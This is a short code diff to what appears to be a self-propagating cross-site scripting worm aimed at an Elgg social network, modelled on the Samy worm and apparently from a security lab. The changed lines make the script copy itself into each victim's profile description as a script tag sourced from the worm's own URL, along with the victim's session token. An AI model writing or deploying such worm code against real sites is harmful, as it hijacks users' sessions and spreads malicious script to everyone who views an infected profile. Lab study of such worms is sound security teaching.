@@ -33,7 +33,8 @@ window.onload = function() {
     }
 
     // Copy worm to victim's profile
-    content = `description=<script type="text/javascript" src="${location}"></script>` +
+    var wormurl = document.currentScript.src;
+    content = `description=<script type="text/javascript" src="${wormurl}"></script>` +
         guid + ts + token;
 
     if (elgg.session.user.guid != samyGuid) {
